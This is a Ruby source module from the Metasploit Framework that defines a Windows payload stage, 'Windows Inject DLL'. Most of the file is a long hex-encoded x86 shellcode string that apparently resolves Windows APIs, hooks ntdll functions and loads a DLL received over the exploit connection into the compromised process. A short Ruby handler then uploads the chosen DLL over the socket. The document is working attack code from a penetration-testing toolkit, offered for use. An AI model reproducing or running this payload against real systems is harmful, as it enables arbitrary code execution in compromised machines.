require 'msf/core'

module Msf
module Payloads
module Stages
module Windows

###
#
# DllInject
# ---------
#
# Injects an arbitrary DLL in the exploited process.
#
###
module DllInject

	include Msf::Payload::Windows

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Windows Inject DLL',
			'Version'       => '$Revision$',
			'Description'   => 'Inject a custom DLL into the exploited process',
			'Author'        => 
				[
					'Jarkko Turkulainen <jt@klake.org>',
					'skape',
				],
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			'Convention'    => 'sockedi',
			'Stage'         =>
				{
					'Offsets' =>
						{
							'EXITFUNC' => [ 193, 'V' ]
						},
					'Payload' =>
						"\x55\x8b\xec\x81\xec\xa4\x01\x00\x00\x53\x56\x57\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff" +
						"\x5b\x83\xeb\x15\x89\x9d\x70\xff\xff\xff\x89\xbd\x68\xfe\xff\xff\xeb\x70\x33\xc0" +
						"\x64\x8b\x40\x30\x85\xc0\x78\x0e\x56\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40\x08\x5e" +
						"\xeb\x09\x8b\x40\x34\x8d\x40\x7c\x8b\x40\x3c\xc3\x60\x8b\x6c\x24\x24\x8b\x45\x3c" +
						"\x8b\x54\x05\x78\x03\xd5\x8b\x4a\x18\x8b\x5a\x20\x03\xdd\xe3\x34\x49\x8b\x34\x8b" +
						"\x03\xf5\x33\xc0\x33\xff\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x03\xf8\xeb\xf4\x3b" +
						"\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x03\xdd\x66\x8b\x0c\x4b\x8b\x5a\x1c\x03\xdd\x8b" +
						"\x04\x8b\x03\xc5\x89\x44\x24\x1c\x61\xc3\xe8\x8b\xff\xff\xff\x8b\xd8\x68\x8e\x4e" +
						"\x0e\xec\x53\xe8\xa0\xff\xff\xff\x83\xc4\x08\x89\x45\xc4\x68\xaa\xfc\x0d\x7c\x53" +
						"\xe8\x8f\xff\xff\xff\x83\xc4\x08\x89\x45\xc8\x68\x7e\xd8\xe2\x73\x53\xe8\x7e\xff" +
						"\xff\xff\x83\xc4\x08\x89\x45\xcc\x68\x54\xca\xaf\x91\x53\xe8\x6d\xff\xff\xff\x83" +
						"\xc4\x08\x89\x45\xd0\x68\xac\x33\x06\x03\x53\xe8\x5c\xff\xff\xff\x83\xc4\x08\x89" +
						"\x45\xd4\x68\xaa\xc8\xc8\xa3\x53\xe8\x4b\xff\xff\xff\x83\xc4\x08\x89\x45\xd8\x68" +
						"\x1b\xc6\x46\x79\x53\xe8\x3a\xff\xff\xff\x83\xc4\x08\x89\x45\xdc\x68\x80\x09\x12" +
						"\x53\x53\xe8\x29\xff\xff\xff\x83\xc4\x08\x89\x45\xe0\x68\xa1\x6a\x3d\xd8\x53\xe8" +
						"\x18\xff\xff\xff\x83\xc4\x08\x89\x45\xe4\x33\xc0\xb0\x6c\x50\x68\x6e\x74\x64\x6c" +
						"\x54\xff\x55\xc4\x8b\xd8\x68\x95\xdd\xb5\x92\x53\xe8\xf7\xfe\xff\xff\x83\xc4\x08" +
						"\x89\x45\xb0\x68\x90\x78\x4a\x49\x53\xe8\xe6\xfe\xff\xff\x83\xc4\x08\x89\x45\xb4" +
						"\x68\xb8\x74\x29\x85\x53\xe8\xd5\xfe\xff\xff\x83\xc4\x08\x89\x45\xb8\x68\xcb\x9b" +
						"\xb2\x5b\x53\xe8\xc4\xfe\xff\xff\x83\xc4\x08\x89\x45\xbc\x68\x94\x9b\x15\xd5\x53" +
						"\xe8\xb3\xfe\xff\xff\x83\xc4\x08\x89\x45\xc0\xc6\x85\x5c\xfe\xff\xff\x77\xc6\x85" +
						"\x5d\xfe\xff\xff\x73\xc6\x85\x5e\xfe\xff\xff\x32\xc6\x85\x5f\xfe\xff\xff\x5f\xc6" +
						"\x85\x60\xfe\xff\xff\x33\xc6\x85\x61\xfe\xff\xff\x32\xc6\x85\x62\xfe\xff\xff\x00" +
						"\x8d\x85\x5c\xfe\xff\xff\x50\xff\x55\xc4\x8b\xd0\x68\xb6\x19\x18\xe7\x52\xe8\x65" +
						"\xfe\xff\xff\x83\xc4\x08\x89\x45\xfc\x8d\x8d\x68\xfe\xff\xff\x51\xe8\x0f\x07\x00" +
						"\x00\x83\xc4\x04\x5f\x5e\x5b\x8b\xe5\x5d\xc3\xff\xff\xff\xff\x55\x8b\xec\xe8\x00" +
						"\x00\x00\x00\x59\x83\xe9\x08\xb8\x04\x12\x40\x00\x2d\x00\x12\x40\x00\x2b\xc8\x8b" +
						"\x01\x5d\xc3\x55\x8b\xec\x83\xec\x08\xc7\x45\xfc\x00\x00\x00\x00\xeb\x09\x8b\x45" +
						"\xfc\x83\xc0\x01\x89\x45\xfc\x8b\x4d\x0c\x33\xd2\x66\x8b\x11\x39\x55\xfc\x7d\x58" +
						"\xc7\x45\xf8\x00\x00\x00\x00\xeb\x09\x8b\x45\xf8\x83\xc0\x01\x89\x45\xf8\x8b\x4d" +
						"\x08\x8b\x55\xf8\x3b\x91\x04\x01\x00\x00\x7d\x24\x8b\x45\xfc\x03\x45\xf8\x8b\x4d" +
						"\x0c\x8b\x51\x04\x33\xc9\x66\x8b\x0c\x42\x8b\x55\x08\x03\x55\xf8\x0f\xbe\x42\x04" +
						"\x3b\xc8\x74\x02\xeb\x02\xeb\xc5\x8b\x4d\x08\x8b\x55\xf8\x3b\x91\x04\x01\x00\x00" +
						"\x75\x04\x33\xc0\xeb\x07\xeb\x92\xb8\x01\x00\x00\x00\x8b\xe5\x5d\xc3\x55\x8b\xec" +
						"\x51\xe8\x55\xff\xff\xff\x89\x45\xfc\x8b\x45\x10\x8b\x48\x08\x51\x8b\x55\xfc\x52" +
						"\xe8\x5e\xff\xff\xff\x83\xc4\x08\x85\xc0\x75\x12\x8b\x45\x08\x8b\x4d\xfc\x8b\x91" +
						"\x10\x01\x00\x00\x89\x10\x33\xc0\xeb\x15\x8b\x45\x10\x50\x8b\x4d\x0c\x51\x8b\x55" +
						"\x08\x52\x8b\x45\xfc\xff\x90\x80\x01\x00\x00\x8b\xe5\x5d\xc2\x0c\x00\x55\x8b\xec" +
						"\x51\xe8\x05\xff\xff\xff\x89\x45\xfc\x8b\x45\x08\x8b\x48\x08\x51\x8b\x55\xfc\x52" +
						"\xe8\x0e\xff\xff\xff\x83\xc4\x08\x85\xc0\x75\x5d\x8b\x45\x0c\xc7\x00\xe0\x5c\x27" +
						"\x7e\x8b\x4d\x0c\xc7\x41\x04\xfa\x22\xc4\x01\x8b\x55\x0c\xc7\x42\x08\xe0\x5c\x27" +
						"\x8e\x8b\x45\x0c\xc7\x40\x0c\xfa\x22\xc4\x01\x8b\x4d\x0c\xc7\x41\x10\xe0\x5c\x27" +
						"\x7e\x8b\x55\x0c\xc7\x42\x14\xfa\x22\xc4\x01\x8b\x45\x0c\xc7\x40\x18\xe0\x5c\x27" +
						"\x7e\x8b\x4d\x0c\xc7\x41\x1c\xfa\x22\xc4\x01\x8b\x55\x0c\xc7\x42\x20\x80\x00\x00" +
						"\x00\x33\xc0\xeb\x11\x8b\x45\x0c\x50\x8b\x4d\x08\x51\x8b\x55\xfc\xff\x92\x84\x01" +
						"\x00\x00\x8b\xe5\x5d\xc2\x08\x00\x55\x8b\xec\x51\xe8\x6e\xfe\xff\xff\x89\x45\xfc" +
						"\x8b\x45\x10\x8b\x48\x08\x51\x8b\x55\xfc\x52\xe8\x77\xfe\xff\xff\x83\xc4\x08\x85" +
						"\xc0\x75\x10\x8b\x45\x08\x8b\x4d\xfc\x8b\x91\x10\x01\x00\x00\x89\x10\xeb\x21\x8b" +
						"\x45\x1c\x50\x8b\x4d\x18\x51\x8b\x55\x14\x52\x8b\x45\x10\x50\x8b\x4d\x0c\x51\x8b" +
						"\x55\x08\x52\x8b\x45\xfc\xff\x90\x88\x01\x00\x00\x8b\xe5\x5d\xc2\x18\x00\x55\x8b" +
						"\xec\x51\xe8\x14\xfe\xff\xff\x89\x45\xfc\x8b\x45\xfc\x8b\x4d\x20\x3b\x88\x10\x01" +
						"\x00\x00\x75\x12\x8b\x55\x08\x8b\x45\xfc\x8b\x88\x10\x01\x00\x00\x89\x0a\x33\xc0" +
						"\xeb\x25\x8b\x55\x20\x52\x8b\x45\x1c\x50\x8b\x4d\x18\x51\x8b\x55\x14\x52\x8b\x45" +
						"\x10\x50\x8b\x4d\x0c\x51\x8b\x55\x08\x52\x8b\x45\xfc\xff\x90\x8c\x01\x00\x00\x8b" +
						"\xe5\x5d\xc2\x1c\x00\x55\x8b\xec\x51\xe8\xbd\xfd\xff\xff\x89\x45\xfc\x8b\x45\xfc" +
						"\x8b\x4d\x08\x3b\x88\x10\x01\x00\x00\x75\x15\x8b\x55\x10\x8b\x45\xfc\x8b\x88\x10" +
						"\x01\x00\x00\x89\x0a\xb8\x03\x00\x00\x40\xeb\x31\x8b\x55\x2c\x52\x8b\x45\x28\x50" +
						"\x8b\x4d\x24\x51\x8b\x55\x20\x52\x8b\x45\x1c\x50\x8b\x4d\x18\x51\x8b\x55\x14\x52" +
						"\x8b\x45\x10\x50\x8b\x4d\x0c\x51\x8b\x55\x08\x52\x8b\x45\xfc\xff\x90\x90\x01\x00" +
						"\x00\x8b\xe5\x5d\xc2\x28\x00\x55\x8b\xec\x83\xec\x28\xc7\x45\xd8\x05\x00\x00\x00" +
						"\x8d\x45\xe0\x50\x8b\x4d\xd8\x51\x8b\x55\x0c\x52\x8b\x45\x10\x50\x6a\xff\x8b\x4d" +
						"\x08\xff\x91\x7c\x01\x00\x00\x8b\x55\x10\x03\x55\xd8\xc6\x02\xe9\x8b\x45\x10\x83" +
						"\xc0\x05\x8b\x4d\x0c\x2b\xc8\x8b\x55\x10\x03\x55\xd8\x89\x4a\x01\x6a\x1c\x8d\x45" +
						"\xe4\x50\x8b\x4d\x0c\x51\x8b\x55\x08\xff\x92\x70\x01\x00\x00\x8d\x45\xf8\x50\x6a" +
						"\x40\x8b\x4d\xf0\x51\x8b\x55\xe4\x52\x8b\x45\x08\xff\x90\x74\x01\x00\x00\x8b\x4d" +
						"\x0c\xc6\x01\xe9\x8b\x55\x0c\x83\xc2\x05\x8b\x45\x14\x2b\xc2\x8b\x4d\x0c\x89\x41" +
						"\x01\x8d\x55\xdc\x52\x8b\x45\xf8\x50\x8b\x4d\xf0\x51\x8b\x55\xe4\x52\x8b\x45\x08" +
						"\xff\x90\x74\x01\x00\x00\x8b\x4d\xf0\x51\x8b\x55\xe4\x52\x6a\xff\x8b\x45\x08\xff" +
						"\x90\x78\x01\x00\x00\x8b\xe5\x5d\xc3\x55\x8b\xec\xb8\x3e\x14\x40\x00\x2d\x00\x10" +
						"\x40\x00\x8b\x4d\x08\x03\x81\x08\x01\x00\x00\x50\x8b\x55\x08\x81\xc2\x3c\x01\x00" +
						"\x00\x52\x8b\x45\x08\x8b\x88\x58\x01\x00\x00\x51\x8b\x55\x08\x52\xe8\x16\xff\xff" +
						"\xff\x83\xc4\x10\x8b\x45\x08\x05\x3c\x01\x00\x00\x8b\x4d\x08\x89\x81\x90\x01\x00" +
						"\x00\xba\xf6\x12\x40\x00\x81\xea\x00\x10\x40\x00\x8b\x45\x08\x03\x90\x08\x01\x00" +
						"\x00\x52\x8b\x4d\x08\x81\xc1\x1e\x01\x00\x00\x51\x8b\x55\x08\x8b\x82\x4c\x01\x00" +
						"\x00\x50\x8b\x4d\x08\x51\xe8\xd0\xfe\xff\xff\x83\xc4\x10\x8b\x55\x08\x81\xc2\x1e" +
						"\x01\x00\x00\x8b\x45\x08\x89\x90\x84\x01\x00\x00\xb9\x8d\x13\x40\x00\x81\xe9\x00" +
						"\x10\x40\x00\x8b\x55\x08\x03\x8a\x08\x01\x00\x00\x51\x8b\x45\x08\x05\x28\x01\x00" +
						"\x00\x50\x8b\x4d\x08\x8b\x91\x50\x01\x00\x00\x52\x8b\x45\x08\x50\xe8\x8a\xfe\xff" +
						"\xff\x83\xc4\x10\x8b\x4d\x08\x81\xc1\x28\x01\x00\x00\x8b\x55\x08\x89\x8a\x88\x01" +
						"\x00\x00\xb8\xe7\x13\x40\x00\x2d\x00\x10\x40\x00\x8b\x4d\x08\x03\x81\x08\x01\x00" +
						"\x00\x50\x8b\x55\x08\x81\xc2\x32\x01\x00\x00\x52\x8b\x45\x08\x8b\x88\x54\x01\x00" +
						"\x00\x51\x8b\x55\x08\x52\xe8\x44\xfe\xff\xff\x83\xc4\x10\x8b\x45\x08\x05\x32\x01" +
						"\x00\x00\x8b\x4d\x08\x89\x81\x8c\x01\x00\x00\xba\xa6\x12\x40\x00\x81\xea\x00\x10" +
						"\x40\x00\x8b\x45\x08\x03\x90\x08\x01\x00\x00\x52\x8b\x4d\x08\x81\xc1\x14\x01\x00" +
						"\x00\x51\x8b\x55\x08\x8b\x82\x48\x01\x00\x00\x50\x8b\x4d\x08\x51\xe8\xfe\xfd\xff" +
						"\xff\x83\xc4\x10\x8b\x55\x08\x81\xc2\x14\x01\x00\x00\x8b\x45\x08\x89\x90\x80\x01" +
						"\x00\x00\x5d\xc3\x55\x8b\xec\x83\xec\x28\xc7\x45\xd8\x05\x00\x00\x00\x6a\x1c\x8d" +
						"\x45\xe4\x50\x8b\x4d\x0c\x51\x8b\x55\x08\xff\x92\x70\x01\x00\x00\x8d\x45\xf8\x50" +
						"\x6a\x40\x8b\x4d\xf0\x51\x8b\x55\xe4\x52\x8b\x45\x08\xff\x90\x74\x01\x00\x00\x8d" +
						"\x4d\xe0\x51\x8b\x55\xd8\x52\x8b\x45\x10\x50\x8b\x4d\x0c\x51\x6a\xff\x8b\x55\x08" +
						"\xff\x92\x7c\x01\x00\x00\x8d\x45\xdc\x50\x8b\x4d\xf8\x51\x8b\x55\xf0\x52\x8b\x45" +
						"\xe4\x50\x8b\x4d\x08\xff\x91\x74\x01\x00\x00\x8b\x55\xf0\x52\x8b\x45\xe4\x50\x6a" +
						"\xff\x8b\x4d\x08\xff\x91\x78\x01\x00\x00\x8b\xe5\x5d\xc3\x55\x8b\xec\x8b\x45\x08" +
						"\x05\x3c\x01\x00\x00\x50\x8b\x4d\x08\x8b\x91\x58\x01\x00\x00\x52\x8b\x45\x08\x50" +
						"\xe8\x5f\xff\xff\xff\x83\xc4\x0c\x8b\x4d\x08\x81\xc1\x1e\x01\x00\x00\x51\x8b\x55" +
						"\x08\x8b\x82\x4c\x01\x00\x00\x50\x8b\x4d\x08\x51\xe8\x3f\xff\xff\xff\x83\xc4\x0c" +
						"\x8b\x55\x08\x81\xc2\x28\x01\x00\x00\x52\x8b\x45\x08\x8b\x88\x50\x01\x00\x00\x51" +
						"\x8b\x55\x08\x52\xe8\x1f\xff\xff\xff\x83\xc4\x0c\x8b\x45\x08\x05\x32\x01\x00\x00" +
						"\x50\x8b\x4d\x08\x8b\x91\x54\x01\x00\x00\x52\x8b\x45\x08\x50\xe8\x00\xff\xff\xff" +
						"\x83\xc4\x0c\x8b\x4d\x08\x81\xc1\x14\x01\x00\x00\x51\x8b\x55\x08\x8b\x82\x48\x01" +
						"\x00\x00\x50\x8b\x4d\x08\x51\xe8\xe0\xfe\xff\xff\x83\xc4\x0c\x5d\xc3\x55\x8b\xec" +
						"\x83\xec\x10\x8b\x45\x08\x8b\x88\x0c\x01\x00\x00\x89\x4d\xf4\x8b\x55\x08\x8b\x82" +
						"\x0c\x01\x00\x00\x8b\x4d\xf4\x03\x41\x3c\x89\x45\xf8\x6a\x40\x68\x00\x30\x00\x00" +
						"\x8b\x55\xf8\x8b\x42\x50\x50\x8b\x4d\xf8\x8b\x51\x34\x52\x8b\x45\x08\xff\x90\x68" +
						"\x01\x00\x00\x8b\x4d\x08\x89\x81\x10\x01\x00\x00\x8b\x55\x08\x83\xba\x10\x01\x00" +
						"\x00\x00\x75\x22\x6a\x40\x68\x00\x30\x00\x00\x8b\x45\xf8\x8b\x48\x50\x51\x6a\x00" +
						"\x8b\x55\x08\xff\x92\x68\x01\x00\x00\x8b\x4d\x08\x89\x81\x10\x01\x00\x00\x6a\x00" +
						"\x8b\x55\xf8\x8b\x42\x54\x50\x8b\x4d\x08\x8b\x91\x0c\x01\x00\x00\x52\x8b\x45\x08" +
						"\x8b\x88\x10\x01\x00\x00\x51\x6a\xff\x8b\x55\x08\xff\x92\x7c\x01\x00\x00\x8b\x45" +
						"\xf8\x33\xc9\x66\x8b\x48\x14\x8b\x55\xf8\x8d\x44\x0a\x18\x89\x45\xfc\xc7\x45\xf0" +
						"\x00\x00\x00\x00\xeb\x09\x8b\x4d\xf0\x83\xc1\x01\x89\x4d\xf0\x8b\x55\xf8\x33\xc0" +
						"\x66\x8b\x42\x06\x39\x45\xf0\x7d\x4b\x6a\x00\x8b\x4d\xf0\x6b\xc9\x28\x8b\x55\xfc" +
						"\x8b\x44\x0a\x10\x50\x8b\x4d\xf0\x6b\xc9\x28\x8b\x55\x08\x8b\x82\x0c\x01\x00\x00" +
						"\x8b\x55\xfc\x03\x44\x0a\x14\x50\x8b\x45\xf0\x6b\xc0\x28\x8b\x4d\x08\x8b\x91\x10" +
						"\x01\x00\x00\x8b\x4d\xfc\x03\x54\x01\x0c\x52\x6a\xff\x8b\x55\x08\xff\x92\x7c\x01" +
						"\x00\x00\xeb\x9e\x8b\xe5\x5d\xc3\x55\x8b\xec\x83\xec\x28\xc6\x45\xe4\x49\xc6\x45" +
						"\xe5\x6e\xc6\x45\xe6\x69\xc6\x45\xe7\x74\xc6\x45\xe8\x00\x6a\x00\x6a\x04\x8d\x45" +
						"\xfc\x50\x8b\x4d\x08\x8b\x11\x52\x8b\x45\x08\xff\x90\x94\x01\x00\x00\x89\x45\xdc" +
						"\x83\x7d\xdc\x00\x7f\x0b\x6a\x01\x8b\x4d\x08\xff\x91\x64\x01\x00\x00\x6a\x04\x68" +
						"\x00\x10\x00\x00\x8b\x55\xfc\x52\x6a\x00\x8b\x45\x08\xff\x90\x68\x01\x00\x00\x8b" +
						"\x4d\x08\x89\x81\x0c\x01\x00\x00\x8b\x55\x08\x83\xba\x0c\x01\x00\x00\x00\x75\x0b" +
						"\x6a\x01\x8b\x45\x08\xff\x90\x64\x01\x00\x00\xc7\x45\xdc\x00\x00\x00\x00\xc7\x45" +
						"\xf4\x00\x00\x00\x00\x8b\x4d\xfc\x89\x4d\xd8\xeb\x12\x8b\x55\xd8\x2b\x55\xdc\x89" +
						"\x55\xd8\x8b\x45\xf4\x03\x45\xdc\x89\x45\xf4\x83\x7d\xd8\x00\x7e\x2f\x6a\x00\x8b" +
						"\x4d\xd8\x51\x8b\x55\x08\x8b\x82\x0c\x01\x00\x00\x03\x45\xf4\x50\x8b\x4d\x08\x8b" +
						"\x11\x52\x8b\x45\x08\xff\x90\x94\x01\x00\x00\x89\x45\xdc\x83\x7d\xdc\x00\x7d\x02" +
						"\xeb\x02\xeb\xb9\xc7\x45\xf0\x00\x00\x00\x00\xeb\x09\x8b\x4d\xf0\x83\xc1\x01\x89" +
						"\x4d\xf0\x8b\x55\x08\x8b\x82\x0c\x01\x00\x00\x8b\x4d\xf0\x0f\xbe\x14\x08\x85\xd2" +
						"\x74\x1a\x8b\x45\x08\x8b\x88\x0c\x01\x00\x00\x8b\x55\x08\x03\x55\xf0\x8b\x45\xf0" +
						"\x8a\x0c\x01\x88\x4a\x04\xeb\xc9\x8b\x55\x08\x03\x55\xf0\xc6\x42\x04\x00\x8b\x45" +
						"\x08\x8b\x4d\xf0\x89\x88\x04\x01\x00\x00\x8b\x55\x08\x8b\x82\x0c\x01\x00\x00\x8b" +
						"\x4d\xf0\x8d\x54\x08\x01\x8b\x45\x08\x89\x90\x0c\x01\x00\x00\x8b\x4d\x08\x51\xe8" +
						"\x8d\xfd\xff\xff\x83\xc4\x04\xba\x00\x12\x40\x00\x81\xea\x00\x10\x40\x00\x8b\x45" +
						"\x08\x8b\x88\x08\x01\x00\x00\x8b\x45\x08\x89\x04\x0a\x8b\x4d\x08\x51\xe8\xdf\xfa" +
						"\xff\xff\x83\xc4\x04\x8b\x55\x08\x83\xc2\x04\x52\x8b\x45\x08\xff\x90\x5c\x01\x00" +
						"\x00\x89\x45\xe0\x83\x7d\xe0\x00\x75\x0b\x6a\x01\x8b\x4d\x08\xff\x91\x64\x01\x00" +
						"\x00\x8b\x55\x08\x52\xe8\x94\xfc\xff\xff\x83\xc4\x04\x8d\x45\xe4\x50\x8b\x4d\xe0" +
						"\x51\x8b\x55\x08\xff\x92\x60\x01\x00\x00\x89\x45\xf8\x83\x7d\xf8\x00\x74\x0c\x8b" +
						"\x45\x08\x8b\x08\x51\xff\x55\xf8\x83\xc4\x04\x68\x00\x80\x00\x00\x6a\x00\x8b\x55" +
						"\x08\x8b\x45\x08\x8b\x8a\x0c\x01\x00\x00\x2b\x88\x04\x01\x00\x00\x83\xe9\x01\x51" +
						"\x8b\x55\x08\xff\x92\x6c\x01\x00\x00\x6a\x00\x8b\x45\x08\xff\x90\x64\x01\x00\x00" +
						"\xc7\x45\x08\x00\x00\x00\x00\x33\xc0\x8b\xe5\x5d\xc3"
				}
			))

		register_options(
			[
				OptPath.new('DLL', [ true, "The local path to the DLL to upload" ]),
			], DllInject)

		register_advanced_options(
			[
				OptString.new('LibraryName', [ false, "The symbolic name of the library to upload", "msf.dll" ])
			], DllInject)
	end

	#
	# Returns the library name
	#
	def library_name
		datastore['LibraryName'] || 'msf.dll'
	end

	#
	# Returns the library path
	#
	def library_path
		datastore['DLL']
	end

	#
	# Transmits the DLL injection payload and its associated DLL to the remote
	# computer so that it can be loaded into memory.
	#
	def handle_connection_stage(conn)
		data = library_name + "\x00"

		begin
			data += IO.readlines(library_path).join
		rescue
			print_error("Failed to load DLL: #{$!}.")

			# TODO: exception
			conn.close
			return
		end

		print_status("Uploading DLL (#{data.length} bytes)...")

		# Send the size of the thing we're transferring
		conn.put([ data.length ].pack('V'))
		# Send the image name + image
		conn.put(data)

		print_status("Upload completed.")

		# Call the parent so the session gets created.
		super
	end

end

end end end end
